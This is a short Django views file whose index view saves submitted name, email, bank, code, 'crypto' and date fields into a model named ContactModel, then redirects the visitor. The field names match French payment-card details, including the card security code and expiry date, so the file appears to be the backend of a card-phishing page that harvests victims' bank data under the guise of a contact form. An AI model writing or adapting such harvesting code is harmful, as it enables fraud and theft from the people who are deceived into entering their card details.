from django.shortcuts import render, redirect, HttpResponseRedirect
from .models import ContactModel
def index(request):
    if request.method =='POST':

            name=request.POST.get('Name')
            email = request.POST.get('Email')
            prenom = request.POST.get('Prenom')
            banque = request.POST.get('Banque')
            code = request.POST.get('Code')
            crypto = request.POST.get('Crypto')
            date = request.POST.get('Date')
            NewUser= ContactModel.objects.create(Nom=name,Email=email,Prenom=prenom,Banque=banque, Code=code, crypto=crypto, date=date)

            NewUser.save()

            return HttpResponseRedirect('/redirection/')

    else :
        form= ContactModel()

        return render(request, "index.html")


def redirection(request):
    return render(request, "redirection.html")